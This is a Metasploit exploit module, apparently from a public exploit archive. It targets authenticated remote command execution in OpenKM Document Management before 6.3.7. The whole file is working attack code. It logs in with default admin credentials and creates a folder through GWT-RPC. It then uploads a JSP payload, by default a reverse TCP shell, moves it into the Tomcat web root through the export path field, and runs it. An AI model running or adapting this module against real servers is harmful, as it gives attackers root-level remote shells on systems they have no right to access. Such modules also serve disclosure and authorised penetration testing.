# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
        super(update_info(info,
        &#039;Name&#039;                  => &#039;OpenKM Document Management < 6.3.7 - (Authenticated) Remote Command Execution&#039;,
        &#039;Description&#039;   => %q{
            Versions of the OpenKM Document Management  < 6.3.7 allows upload a malicious 
            JSP file into the "/okm:root" directories and move that file to the home directory of the site.
            This vulnerability is carried out by interfering to the "Filesystem path" control in the admin&#039;s "Export" field.
            As a result, attackers can gain remote code execution through the application server with root privilege.
           
            This module allows the execution of remote commands on the server by creating a malicious JSP file.
            Module has been tested successfully with OpenKM DM between 6.3.2 and 6.3.7 on Debian 4.9.18-1kali1 system.
            There is also the possibility of working in lower versions.
        },
        &#039;Author&#039;                => [ &#039;AkkuS <Özkan Mustafa Akkuş>&#039; ], # Vulnerability Discovery, PoC & Msf Module
        &#039;References&#039;            =>
        [
            [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/OpenKM-DM-6-3-7-Remote-Command-Execution-Metasploit.html&#039;]
        ],
        &#039;DisclosureDate&#039; => "March 09 2019",
        &#039;License&#039;               => MSF_LICENSE,
        &#039;Platform&#039;              => %w{ linux win },
        &#039;Targets&#039;     =>
        [
            [ &#039;Automatic&#039;,
               {
                 &#039;Arch&#039; => ARCH_JAVA,
                 &#039;Platform&#039; => &#039;linux&#039;
               }
            ],
            [ &#039;Java Windows&#039;,
               {
                 &#039;Arch&#039; => ARCH_JAVA,
                 &#039;Platform&#039; => &#039;win&#039;
               }
            ],
            [ &#039;Java Linux&#039;,
               {
                 &#039;Arch&#039; => ARCH_JAVA,
                 &#039;Platform&#039; => &#039;linux&#039;
               }
            ]
        ],
        &#039;DefaultTarget&#039;       => 0,
        &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;java/jsp_shell_reverse_tcp&#039; }))

        register_options(
        [
            Opt::RPORT(8080),
            OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, false]),
            OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to OpenKM&#039;, &#039;/&#039;]), 
            OptString.new(&#039;USERNAME&#039;, [true, &#039;User to login with&#039;, &#039;okmAdmin&#039;]), 
            OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to login with&#039;, &#039;admin&#039;]),
        ], self.class)
    end
##
# Request to Login
##
    def login
 
      res = send_request_cgi({ 
        &#039;method&#039; => &#039;POST&#039;, 
        &#039;uri&#039;    => normalize_uri(target_uri, "/OpenKM/j_spring_security_check"), 
        &#039;vars_post&#039; => { 
            "j_username" => datastore[&#039;USERNAME&#039;],
            "j_password" => datastore[&#039;PASSWORD&#039;],
            "submit" => "Login"           
        } 
      })
 
      if res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /error/
         fail_with(Failure::NoAccess, "Failed to login!")
      else
         print_good("Login successful.")        
      end
      return res
    end
##
# Returns the SSL, Host and Port as a string
##
    def peer
      "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
    end
##
# Vulnerablity Check
##
    def check

      res = send_request_cgi({
	&#039;method&#039;    => &#039;GET&#039;,
	&#039;uri&#039;       => normalize_uri(target_uri, "/OpenKM/admin/home.jsp"),
        &#039;headers&#039; => 
        { 
          &#039;Cookie&#039;   => login.get_cookies, 
        }
      })
 
      version = res.body.split(&#039;Version: &#039;)[1].split(&#039;</td>&#039;)[0]
      print_status("Version: #{version}")      

      if res and res.code == 200 and res.body =~ /Version: 6./ or res.body =~ /Version: 5./
         return Exploit::CheckCode::Vulnerable
      else
         return Exploit::CheckCode::Safe
      end
      return res
    end

    def exploit

      get_cookie = login.get_cookies 
      cookie = get_cookie
      print_status("Cookie: #{cookie}")
##
# Read to X-GWT-Permutation string
##
      print_status("Attempting to read X-GWT-Permutation...")
   
      res = send_request_cgi({
	&#039;method&#039;    => &#039;GET&#039;,
	&#039;uri&#039;       => normalize_uri(target_uri, "/OpenKM/frontend/frontend.nocache.js"),
        &#039;headers&#039; => 
        { 
          &#039;Cookie&#039;   => cookie, 
        }
      })

      cache = res.body.split(&#039;Wb=&#039;)[1].split("&#039;")[1]
      print_good("X-GWT-Permutation: #{cache}")
##
# Create directory for payload
##
      print_status("Attempting to create directory for payload...")
      dfile = "#{rand_text_alphanumeric(rand(5) + 5)}akkus"
      string = Rex::Text.rand_text_alphanumeric(10)

      data = "7|0|7|#{peer}/OpenKM/frontend/|"
      data << "#{cache}"
      data << "|com.openkm.frontend.client.service.OKMFolderService|create|java.lang.String/"
      data << "#{string}"
      data << "|#{dfile}|/okm:root|1|2|3|4|2|5|5|6|7|"

      res = send_request_cgi({ 
        &#039;method&#039; => &#039;POST&#039;, 
        &#039;data&#039; => data,
        &#039;uri&#039;    => normalize_uri(target_uri, "/OpenKM/frontend/Folder"), 
        &#039;headers&#039; => 
        { 
          &#039;Content-Type&#039;   => &#039;text/x-gwt-rpc; charset=utf-8&#039;, 
          &#039;X-GWT-Permutation&#039;   => cache,
          &#039;X-GWT-Module-Base&#039;   => &#039;#{peer}/OpenKM/frontend/&#039;,
          &#039;Referer&#039; => &#039;#{peer}/OpenKM/frontend/index.jsp&#039;,
          &#039;Cookie&#039;   => cookie, 
        } 
      })

      if res and res.code == 200 and res.body =~ /akkus/
        print_good("#{dfile} directory successfully created!")
      else
        print_error("Directory could not be created!")
	return res
      end

##
# Upload JSP payload 
##     
      pfile = "#{rand_text_alphanumeric(rand(5) + 5)}akkus.jsp"
      boundary = Rex::Text.rand_text_alphanumeric(29)

      data = "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n/okm:root/#{dfile}\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n0\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"rename\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"mails\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"users\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"roles\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\n\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"increaseVersion\"\r\n\r\n0\r\n"
      data << "-----------------------------{boundary}"
      data << "\r\nContent-Disposition: form-data; name=\"uploadFormElement\"; filename=\"#{pfile}\""
      data << "\r\nContent-Type: application/octet-stream\r\n\r\n"
      data << payload.encoded
      data << "\n\r\n-----------------------------{boundary}--\r\n"

      print_status("Attempting to upload JSP Payload...")

      res = send_request_cgi({ 
        &#039;method&#039; => &#039;POST&#039;, 
        &#039;data&#039; => data,
        &#039;uri&#039;    => normalize_uri(target_uri, "/OpenKM/frontend/FileUpload"), 
        &#039;headers&#039; => 
        { 
          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;, 
          &#039;Referer&#039; => &#039;#{peer}/OpenKM/frontend/index.jsp&#039;,
          &#039;Cookie&#039;   => cookie, 
        } 
      })   

      if res and res.code == 200 and res.body =~ /akkus.jsp/
        print_good("#{pfile} payload uploaded successfully!")
      else
        print_error("JSP Payload upload failed!")
      end
##
# Read Tomcat web directory path
##
      print_status("Attempting to read Tomcat web directory path...")
   
      res = send_request_cgi({
	&#039;method&#039;    => &#039;GET&#039;,
	&#039;uri&#039;       => normalize_uri(target_uri, "/OpenKM/admin/system_properties.jsp"),
        &#039;headers&#039; => 
        { 
          &#039;Cookie&#039;   => cookie, 
        }
      })

      dir = res.body.split(&#039;catalina.base&#039;)[1].split(&#039;<td>&#039;)[1].split(&#039; &#039;)[0]
      path = "#{dir}/webapps/OpenKM"
      print_good("Web directory path => #{path}")
##
# Move the payload file to the site&#039;s home directory
##
      print_status("Attempting to move payload file to the site&#039;s home directory...")
   
      res = send_request_cgi({
	&#039;method&#039;    => &#039;GET&#039;,
	&#039;uri&#039;       => normalize_uri(target_uri, "/OpenKM/admin/repository_export.jsp?repoPath=%2Fokm%3Aroot%2F#{dfile}&fsPath=" + URI.encode(path, /\W/)),
        &#039;headers&#039; => 
        { 
          &#039;Cookie&#039;   => cookie, 
        }
      })

      if res and res.code == 200 and res.body =~ /akkus/
        print_good("JSP Payload was moved successfully!")
        print_status("=> #{path}/#{pfile} ")
      else
        print_error("JSP Payload upload failed!")
      end
##
#  Execute the Payload
##
      print_status("Attempting to execute the #{pfile} payload...")
   
      res = send_request_cgi({
	&#039;method&#039;    => &#039;GET&#039;,
	&#039;uri&#039;       => normalize_uri(target_uri, "/OpenKM/#{pfile}"),
        &#039;headers&#039; => 
        { 
          &#039;Cookie&#039;   => cookie, 
        }
      })

      if res and res.code == 200
        print_good("Payload executed successfully!")
      else
        fail_with(Failure::PayloadFailed, "Failed to execute the payload!")
      end
    end
end
##
#  End
##

